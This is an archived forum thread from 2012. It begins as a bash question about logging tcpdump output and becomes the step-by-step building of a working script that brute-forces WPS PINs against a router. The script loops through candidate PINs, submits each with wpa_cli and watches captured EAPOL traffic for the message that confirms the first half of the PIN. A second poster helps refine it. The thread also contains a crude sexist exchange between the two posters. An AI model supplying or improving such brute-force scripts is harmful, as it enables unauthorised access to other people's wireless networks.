---
title: "Logging multiple piped data"
date: 2012-02-20
forum: Programming Talk
---

### Post by Eiji Takanaka on 2012-02-20
Hi there i was wondering if it was possible to 'log' in two places on a piped data stream.

Example is this....

sudo tcpdump -i wlan0 -v >> /home/User/log.txt | grep 'id 4' >> /home/User/log1.txt.

Do i need to close the pipe each time i do a grep command? I.e dump the data to /log.txt? 

Or is it possible to log & throughput the grep'd data simultaneously? 

tcpdump is a persistent process, thus closing it is a no-go.

Meaning the next viable step would probably be to dump the data temporarily to the middle log in the stream, before opening it again to be grepped?

Running the command as is, results in all info being logged to 'log.txt' on exiting tcpdump, but the | grep part of the stream is not operative. 

Why is this?

Cheers.

---

### Post by Khayyam on 2012-02-20
Eiji ...

I think what your looking for is a "[named pipe]("http://en.wikipedia.org/wiki/Named_pipe")", or perhaps simply 'tee' would suffice.

For a named pipe: 

```
% mkfifo /tmp/tcpdump.fifo
% tcpdump -i wlan0 -v > /tmp/tcpdump.fifo
% cat /tmp/tcpdump.fifo | tee >> /home/user/log.txt | grep 'id 4' >> /home/user/log1.txt
```or perhaps tee is enough ...

```
% tcpdump -i wlan0 -v | tee >> /home/user/log.txt | grep 'id 4' >> /home/user/log1.txt
```I didn't test either of these as I don't have tcpdump here, but they should work as expected.

HTH ... khay

Ab scriptum: I should have mentioned that with the fifo (named pipe) you can have additional stdouts from the same fifo. So, along with the above example, you could simultaniously 'tail -f', or grep for another sting.

---

### Post by Eiji Takanaka on 2012-02-20
Cool i shall have a little look into tee at the next opportunity i get. 

Trying to assimilate too much at once results in severe brain-drain. =P

Thanks for taking the time to reply dude!

Regards,

- dan

---

### Post by Eiji Takanaka on 2012-02-21
O.k i looked into tee a bit, i'm not sure thats what i'm really after, i might have to look further into named pipes though.

Perhaps if i explain what i want to accomplish it might shed further light on any potential work-arounds, i know what i want to do but i'm not sure i'm using the right syntax i guess. Further comments in with the code below...
> 
#!/bin/bash

         sudo tcpdump -i wlan0 -v >> /home/User/log.txt &  

#This works putting the process into the background and continuing with the rest of the script,which is what i wanted to do, but the logging side does not work. Unless strangely enough i break the program ctrl+c, when it does what i expected it to do & outputs to the path above. I've noticed if i let the script run to completion tcpdump is still running in the background. I'm guessing this is because i spawned a sub-shell as a background process and there is no code to terminate this shell.

I tried inserting a sudo kill -9 $(ps -A | grep tcpdump | awk '{print$1'}) line at the end of my script to kill this subshell, and hoping the data from the logging process would be dumped, but it didn't seem to work =P.

sleep 7

    for i in {0..100}; do
        code=$(printf "%04d"000 $i)
        ans=$(ean8 $code) 
        echo "Time : $(date +%H:%M:%S)"
        echo "Time : $(date +%H:%M:%S)" >> /home/User/log1.txt
        echo "BSSID : BSSID"
        echo "WPS PIN : $ans" >> /home/User/log1.txt
        echo "WPS PIN : $ans"
        wpa_cli wps_reg BSSID $ans >> /dev/null


        sleep 10Any ideas where i'm going right/wrong would be welcome! =)

Cheers,

- dan

---

### Post by Khayyam on 2012-02-21
> **Eiji Takanaka said:**
> Any ideas where i'm going right/wrong would be welcome!

Dan ...

I'm not entirely sure what your trying to do in the above, but the two 'logs' are not from the same pipe as you had initially suggested.

I think your logging issue stems from 'sudo', sudo expects itself to be interactive and so the '&' doesn't behave as expected. This is a guess as I know sudo has a '-b' switch, so it sorta makes sense. This issue might be solved in the following manner (untested):

```
#!/bin/bash

IFACE="wlan0"

sudo -b tcpdump -Z ${USER} -i ${IFACE} -v >> ${HOME}/log.txt &
```I would generally use 'su -c' for this kind of thing so if '-b' doesn't provide any output the perhaps 'sudo bash -c' will.   

As for your code, I can understand what it does but I can't see how the 'tcpdump' and subsequent commands are connected, and it doesn't tally with your inital snippet. Its very much like there are two entirely seperate tasks being performed, and no particular reason for each.

The first task starts tcpdump and rediects its output to a file. The second itterates through a four digit number which is converted to ean8 and is then passed to wpa_client. This process is both logged and echo'ed (odd). Neither of these tasks are connected, and I can't see how you intend them to be.  

As for killing the process you can do something like the following:

```
sudo -b tcpdump -Z ${USER} -i ${IFACE} -v >> ${HOME}/log.txt &

PID=$!

echo "code insertion here"

kill -9 ${PID}
```So, hopefully that will help iron out some of the wrinkles, which is about the best I can do under the circimstances.

best ... khay

---

### Post by Eiji Takanaka on 2012-02-22
Yeah sorry about changing the goalposts to do with the two logs ;), basically the 2 logs being piped wouldn't output data so i took it back down to one log, and that wouldn't work either. 

Forget the grep bit of that, i'm having difficulties merely logging the data from the output of tcpdump e.t.c, as you say perhaps this is to do with sudo, i shall have to experiment ;)

Further experimentation yields interesting results. 

If i change the line "sudo tcpdump -i wlan0 -v >> /home/User/log.txt &" Which does not log unless ctrl+c'd, 

To simply "sudo tcpdump -i wlan0 -v &.

It performs as i expected and outputs what i need it to, to stdout.
This operation is ideal, but i just need it to print what its printing on screen to a log as well as to stdout.
Why then, can i not redirect, from stdout to a log?

 P.s the pid is usually not static hence why i used the sudo kill -9 $(ps -A | grep tcpdump | awk '{print$1'}) workaround. Or is the way you shared also a way of doing this? 

The two processes are related. The tcpdump process logs eapol handshakes with a timestamp, which when cross correlated with the output from the other log, lists which wps pin was used at which time.

The final part of the code, i haven't implemented yet will be a code to grep the output file for 'id 4' which will return a positive m5 acknowledgement, and thus the first half of the wps pin.

I hope this helps explain a little ;)

---

### Post by Khayyam on 2012-02-22
> **Eiji Takanaka said:**
> [...] i'm having difficulties merely logging the data from the output of tcpdump e.t.c, as you say perhaps this is to do with sudo, i shall have to experiment

OK, lets solve this problem first.

```
#!/bin/bash

FIFO="/tmp/tcpdump.fifo"
IFACE="wlan0"

if [[ ! -p ${FIF0} ]]; then
    mkfifo ${FIFO}
fi

sudo -b tcpdump -Z ${USER} -i ${IFACE} -v -w - | tee -a ${FIFO} > ${HOME}/log.txt &

PID=$!

echo "test .. tcpdump is backgrounded"

sleep 30

kill -9 ${PID}

if [[ ! -s $HOME/log.txt]]; then
    echo "${HOME}/log.txt is empty"
fi
```> **Eiji Takanaka said:**
> Further experimentation yields interesting results. 

If i change the line "sudo tcpdump -i wlan0 -v >> /home/User/log.txt &" Which does not log unless ctrl+c'd, 

To simply "sudo tcpdump -i wlan0 -v &".

It performs as i expected and outputs what i need it to, to stdout.

Which suggests that sudo doesn't play well with redirection.
  
> **Eiji Takanaka said:**
> This operation is ideal, but i just need it to print what its printing on screen to a log as well as to stdout. Why then, can i not redirect, from stdout to a log?

Well, this is the purpose of 'tee':

```
sudo tcpdump -i wlan0 -v | tee -a $HOME/log.txt &
```This will 'plumb' the pipe into a "T", and so provide two stdout's. 

  > **Eiji Takanaka said:**
> P.S the pid is usually not static hence why i used the sudo kill -9 $(ps -A | grep tcpdump | awk '{print$1'}) workaround. Or is the way you shared also a way of doing this?

Firstly, that command doesn't always work as you might expect .. example:

```
% grep --version |head -1
GNU grep 2.5.1
% ps -A | grep tcpdump
 26967 pts/1    0:00.00 grep tcpdump
% ps -A | grep [t]cpdump
%
```In the first, grep also returns itself as a match. To be safe with this kind of thing a unique [s]tring should be used.

Secondly, "$!" is the PID of the last command, so we can store it in a variable and use it later on to kill.  

> **Eiji Takanaka said:**
> The two processes are related. The tcpdump process logs eapol handshakes with a timestamp, which when cross correlated with the output from the other log, lists which wps pin was used at which time.

OK, but I don't see this "cross corrolation".

> **Eiji Takanaka said:**
> The final part of the code, i haven't implemented yet will be a code to grep the output file for 'id 4' which will return a positive m5 acknowledgement, and thus the first half of the wps pin.

I see, Stefan Viehböck has already shown this vunerability, and there is probably code out there to exploit it (I imagine aircrack-ng has it as a features), so why?

best ... khay

---

### Post by Eiji Takanaka on 2012-02-22
Why not?

;) 

I like to keep things simple. (Haha which is all well and good because thats about the current standard of my programming expertise ;)

If i can do something in 20 lines of simple code, why make it any longer than it needs to be?. (*Edit* granted i do call other programs with significantly more lines of code though ;) i.e ean8, tcpdump & wpa_cli =P) Haha before i go sounding too big-headed and ****, "yeh yeh i can hack into government headquarters with a tandy pocket calculator, a felt-tip pen and a few assorted paper clips" 

*Whistles A-team music to self*.

This process of enumerating wps pins works. I didn't personally manage to get the reaver program working on my system, so i created an alternate work-around to solve the problem. (with some research and some help from a cool dude ;)

All i'm trying to do now is eliminate the semi-automatic aspect of it (before i would start wireshark log it with timestamp enabled), start the wpa_cli script (the incrementing counter with ean8 that you mentioned , and after 1000 or so attempts, Output the log from wireshark in plain text, Grep for an M5 message, then  cross "correlate" ;) the timestamp from the other log (in the simple program i wrote). Matching the time there with the M5 timestamp, thus yielding the first 4 pins of the wps pin-code. Very slight alteration to script for second half of pin.

I'm fully aware there are alternatives out there, and without the pioneers like stefan and others, my alternate, very very basic work around, would not even be in the light of day, but i figure if i can do the same thing with basic generic linux tools and about 20-30 lines of code, then hey i might learn something in the process too right? ;). As long as i fully understand everything thats going on in my program i'm going to take it and try and slowly but surely improve functionality, its more a learning process for me to be honest! 

I've realised bash is like a swizz army knife of programming tools, extremely useful!

I've got major brain-drain tonight, but tommorrow i will try and see if i can get tee working in le program! (and have a look at your thoughts on sudo work arounds, thanks by the way! :) 

I know the next step in programming  is getting the program working universally on as many systems as possible, but to start if i can hack it to work on mine and do what i want it to, and understand everything going on in it, then i figure as i become more knowledgeable i can work on making my code more .....universal 

This program has been an interesting step into programming for me and has inspired me to learn more. 

Thats why ;). 

Thanks for taking the time to reply dude!

---

### Post by Khayyam on 2012-02-23
> **Eiji Takanaka said:**
> [...] This program has been an interesting step into programming for me and has inspired me to learn more.

I see, thats reason enough I guess, but IMO its generally better to get aquatinted with the language, tools, etc, from the technical end .. reading manuals, others code, etc, it'll give you a better grounding. The problem with tinkering is that you can often end up with 'solutions' without really understanding the mechanics.

> **Eiji Takanaka said:**
> Thanks for taking the time to reply dude!

Your welcome "girly!" ... let me know how it works out with the above test.

best ... khay

---

### Post by Eiji Takanaka on 2012-02-23
I'm a dude not a girl dude ;).

I fully understand the mechanics of my script. I'm just trying to further improve/refine it, which will involve learning more.

Thanks for the advice though young squire! ;)

---

### Post by Khayyam on 2012-02-23
> **Eiji Takanaka said:**
> I'm a dude not a girl dude

Thats why I put it in quotes, "dude". If your going to make assumptions about my gender then its fair enough that I do the same, no?

> **Eiji Takanaka said:**
> Thanks for the advice though young squire!

Your welcome young maiden!

---

### Post by Eiji Takanaka on 2012-02-24
I can see now the error of my ways.

You must be a woman, because only a woman could be so damned pedantic ;)

Welcome to p.c world! ;)

*hoho that comment will probably raise a few eyebrows (or eyelashes) to be sure. 

Before the womans liberation/rights brigade start goose stepping their way in here, i'd best depart whilst nonchalantly whistling a tuneful melody.

*Whistles tuneful melody*

*exit stage left*

P.s Nah just messing, women are awesome.

Especially the smoking hot ones with nice racks of lamb. 

Ggggg racks of lamb.....gggg. *drools. 

- end -

---

### Post by Eiji Takanaka on 2012-02-24
Look man, when i say "dude" i mean it in a universal context. I know dudette would probably be the correct terminology for a chica, but i dunno i've always just got along just fine using "dude" for everyone else.

If you are indeed a "dudette" though, i apologize.

---

### Post by Khayyam on 2012-02-24
> **Eiji Takanaka said:**
> You must be a woman, because only a woman could be so damned pedantic.

Yeah, "obviously". You, on the other hand, are really good at assuming ... and then "guessing" ... but what has my gender, real or imagined, got to do with "logging multiple piped data"?

I made no assumptions about you, and only asked that you do me the same courtesy. Simple enough, no? If this is "P.C" then you obviously haven't been paying any attention to politics in the past 40 years. Yes, its "political correctness gone mad", "[...] they made me cut my sausage off" said one agitated Daily Mail reader!

Go figure ..

---

### Post by Eiji Takanaka on 2012-02-24
Read your first sentence dude, and then take a few moments to think about it.

As it reinforces my point in its totality. 

Gender has nothing to do with it your right, so why are you getting so offended and being so bloody pedantic about the use of the generic term "dude". I made no assumptions or guesses, i merely used a tag word as i don't know your actual name or whether you are male or female, and dude can generally be used in a universal context. I.e it can describe both men and women. 

It is usually also accepted as a complimentary word so there is no bad beef behind it in that respect either, and as you were trying to help me out with a problem i felt it was a worthy title to bestow. 

You take offense way too easily man! There was no bad intent behind the usage of the word so chill-out!

---

### Post by Khayyam on 2012-02-24
> **Eiji Takanaka said:**
> [..] Gender has nothing to do with it your right, so why are you getting so offended and being so bloody pedantic about the use of the generic term "dude".

I was neither "offended" nor "pedantic", had I been offended I would have said so, and not called you "girly". Have you asked yourself why you didn't take your own advice? After all, why be "pedantic" and say "I'm a dude not a girl dude".

It doesn't really matter to me if you call me "dude", "squire", "sir" "your majesty", or whatever, but I reserve the right to respond in kind.

So, I wasn't being pedantic, if you can't handle being called "girly" then I'd suggest you stop calling people "dude" and "squire".

---

### Post by Eiji Takanaka on 2012-02-24
Whatever man. ;)

*yawn*

---

### Post by Eiji Takanaka on 2012-02-25
Tee was the way forward after all but it did also involve a switch in the tcpdump program in order to get "tee" working nominally. 

Combined with an -l switch in tcpdump.

sudo tcpdump -i wlan0 -v -l 2> /dev/null | tee log.txt &

= desired outcome. 

Regards, 

And thanks for the pointers dude/dudette ;) 

- dan

---

### Post by Khayyam on 2012-02-26
> **Eiji Takanaka said:**
> Tee was the way forward after all but it did also involve a switch in the tcpdump program in order to get "tee" working nominally. Combined with an -l switch in tcpdump.

OK, good. I'd assumed the "- |" would provide a direction for the pipe, but a look at 'man tcpdump' might have helped as I wasn't aware of the '-l' switch.

I didn't mention previously but the reason I used '-Z ${USER}' was so that it drops privileges once the device is bound .. it makes no difference except that it means the tcpdump process can be killed by ${USER}.

I still don't get how the output of tcpdump is used by the 'for ; do' section, but no matter.

best ... khay

---

### Post by Eiji Takanaka on 2012-02-28
Hey again. Yeah i was wondering if there was a workaround for using sudo kill -9 at the end of my script, as it involves entering the admin password, before essentially exiting the program, which is somewhat annoying.

Therefore if i can use a plain old kill command to kill tcpdump without the sudo prefix, it would save having to enter the password unnesscarily. 

I will experiment with this, thanks. I also looked into environmental variables and have seen how $USER (amongst other terms) are preset statements, which are useful! 
 
O.k so first off i set tcpdump running in the background to capture packets and log them. Also i send a redirect for any stderrs from tcpdump to /dev/null, this is just to "clean things up a bit".

> sudo tcpdump -i wlan0 -v -l 2> /dev/null | tee log.txt &Then i run a for loop that  increments the first 4 digits of an 8-digit counter, the format in which to print the digits is defined by the printf "%04d"command. The next 3 digits are fixed 000 as you can see in the code, the variable $i being assigned to the for i in {0..2} incrementing function. 

I just experimented with this and placing 000 directly after the format and before the $i variable resulted in....0000000, 0001000, 0002000 incrementation which is what i was after. This incrementing 7 digit counter is then assigned to the $code variable. 

> for i in {0..1000}; do
        code=$(printf "%04d"000 $i)
        ans=$(ean8 $code)After which i define a new variable "ans" This is defined by starting up an ean8 calculator module (kindly donated by another person on these forums ;) and piping the $code variable into it. This then appends the ean-8 checksum for the 7 digits, and assigns it to the new variable $ans.

This 8 digit number is then both logged and echo'd on screen, but most importantly it is piped into the wpa_cli program (front-end to wpa_supplicant), and used as a means to test for weak wps_pins. (ala the method you mentioned that was discovered by stephan and others.

Why this is an interesting work-around is that all these tools that i used, are generic linux tools, available on most linux systems, and the code to make this method operate can be utilized within about 30 lines (although obviously peripheral code in tcpdump, ean8 e.t.c is essential too ;).

> #!/bin/bash

        sudo tcpdump -i wlan0 -v -l 2> /dev/null | tee log.txt &

sleep 7

        for i in {1000..3000}; do
        code=$(printf "%04d"000 $i)
        ans=$(ean8 $code)
        echo "Time : $(date +%H:%M:%S)" >> /home/$USER/log1.txt
        echo "BSSID : BSSID HERE" >> /home/$USER/log1.txt
        echo "WPS PIN : $ans"
        echo "WPS PIN : $ans" >> /home/$USER/log1.txt
        wpa_cli wps_reg BSSID HERE $ans >> /dev/null

sleep 9

done

sudo kill -9 2> /dev/null $(ps -A | grep tcpdump | awk '{print$1}')

exit 0I've improved this slightly since my first venture into programming, i was pleased that i managed to get the tcpdump log working, because before i had to manually start wireshark, therefore the tcpdump'ing marked a slightly more automated approach.

The next step is to incorporate grepping into the program. 

This will grep the tcpdump log (beggining bit of code) for 'id 4' which upon finding a positive result will stop the process. 

I figure the best way to do this would be to incorporate the grep into the for loop. Stopping the process and printing the $ans variable along with a message such as "first 4 digits of wps pin found!" if the grep results = true. 

Anyways more stuff for me to look into and learn about so its all good ;).

Regards. 

- dan

---

### Post by Khayyam on 2012-02-28
Dan .. v. quick reply as I'm in the process of doing other things:

Firstly, add tcpdump to the sudoers file, as then you won't be required to provide a pass and can skip the 'sleep 7', which is there, I assume, to provide time for the password to be entered. 'sudo sudoedit' and add:

```
<your_username> ALL=(root) /usr/sbin/tcpdump
```

I've edited your (updated) script, adding some of my previous suggestions, like "$!" to place the pid into a variable, and some checks at the end. It's probably best to send an interupt (-2), and then if it doesn't die nice, -9.

```
#!/bin/bash

sudo tcpdump -Z ${USER} -i wlan0 -v -l 2> /dev/null | tee log.txt &

PID=${!}

for i in {1000..3000}; do
    code=$(printf "%04d"000 $i)
    ans=$(ean8 $code)
    echo "Time : $(date +%H:%M:%S)" >> /home/$USER/log1.txt
    echo "BSSID : BSSID HERE" >> /home/$USER/log1.txt
    echo "WPS PIN : $ans"
    echo "WPS PIN : $ans" >> /home/$USER/log1.txt
    wpa_cli wps_reg BSSID HERE $ans >> /dev/null
    sleep 9
done

kill -2 ${PID}

if [[ "$?" = 0 || -z $(ps -p ${PID} -o comm=) ]]; then
    echo "${PID}: tcpdump killed"
else
    kill -9 ${PID}
    echo "${PID}: tcpdump killed"
fi
exit 0
```

I don't think grepping is a good idea, there is a good chance you'll end up with a race condition, remember its a data steam. I'm not entirely sure how best to aproach this but I would probably go with [parallel](http://www.gnu.org/software/parallel/) in conjunction with awk, the data can be 'paralleled' while awk parses it for 'id 4'. Could you post an example line from the logs with this string? If the task is simply to parse the data until 'id 4' occurs then it should be relatively straightforward.

Must dash .. khay

---

### Post by Eiji Takanaka on 2012-03-01
Hello once again,

I'm going to perhaps try and introduce some of the things you mentioned into my code when i next get around to it, 

A couple of questions though in the mean-time if i may.

Why do you define the global variable $USER in the fashion you do on the tcpdump line? (i.e ${USER}).

would simply $USER not be viable?

Why bother with a kill 2 (siginterrupt) as opposed to just sending a kill 9? If it needs to die then theres no point in beating about the bush is there? 

 Saying this though, I was wanting to start looking into conditional variables as a next  step, this gives me a bit of insight into such things.

Thanks for the pointers. ;).

- dan.

I guess my attitude to programming is kind of samurai'esque. hoho. ah well *wipes blood from blade and returns it to sheath*. ;)

P.s i hear what your saying about greping on an active process, it might not be the best of ideas, perhaps a workaround will be to do a for loop on say {0..100}. Then after that loop ends grep those results, before starting a new loop {101..200}.

Saying this though i could make the greppage at even smaller intervals, what i'd need to do to make this a viable solution is increment the for loop {0..10} (for example) automatically with a little piece of scriptage. 

I've been trying to avoid entering into this situation because i get the feeling it will begin to get quite complex, and i'm trying to stick with fairly basic stuff at the moment. ;)

As a basic work around i could simply repeat the for loop adding a grep after each loop
> for i in {0..100}; do     code=$(printf "%04d"000 $i)     ans=$(ean8 $code)     echo "Time : $(date +%H:%M:%S)" >> /home/$USER/log1.txt     echo "BSSID : BSSID HERE" >> /home/$USER/log1.txt     echo "WPS PIN : $ans"     echo "WPS PIN : $ans" >> /home/$USER/log1.txt     wpa_cli wps_reg BSSID HERE $ans >> /dev/null     sleep 9 done

before repeating but simply incrementing the {0..100} to {101..200} e.t.c.

I'm sure theres a sleek way of doing this, but like i say i'm trying to understand everything i'm learning for the time being ;)

---

### Post by Khayyam on 2012-03-02
> **Eiji Takanaka said:**
> [...] A couple of questions though in the mean-time if i may.

Why do you define the global variable $USER in the fashion you do on the tcpdump line? (i.e ${USER}). Would simply $USER not be viable?

Because the braces protect the variable, it's good coding pracitce, it matters when doing $var1-$var2 .. how is the shell to know that "-" is **not** part of $var1? It may seem trivial but I could point to numerious occasions when it bites. Mostly its because people are reading, and I'm presenting, so want that they adopt "best practices" ... code readability, simplicity, etc, etc.  

> **Eiji Takanaka said:**
> Why bother with a kill 2 (siginterrupt) as opposed to just sending a kill 9? If it needs to die then theres no point in beating about the bush is there?

Why do computers come with a power button? You could just pull the plug, "there's not point beating arround the bush". Similarly with processes, there are a variety of signals for a reason, it costs nothing to send an interupt and check its return status, most applications will exit after a interupt, KILL is intended for situations where the proccess is locked into a tailspin. Why use it if its un-necessary?  kill -9 is used because most people can't afford to pay for the other numbers .. heh. The interupt isn't wasteful as tcpdump will exit just fine, we check its return to make sure all is well, thats all.

 > **Eiji Takanaka said:**
> Saying this though, I was wanting to start looking into conditional variables as a next  step, this gives me a bit of insight into such things.

You mean test conditions? Its a good way to check something and set a variable, or number of variables (with else, elif), in response.

> **Eiji Takanaka said:**
> Thanks for taking the time to respond.

Your welcome ... khay

---

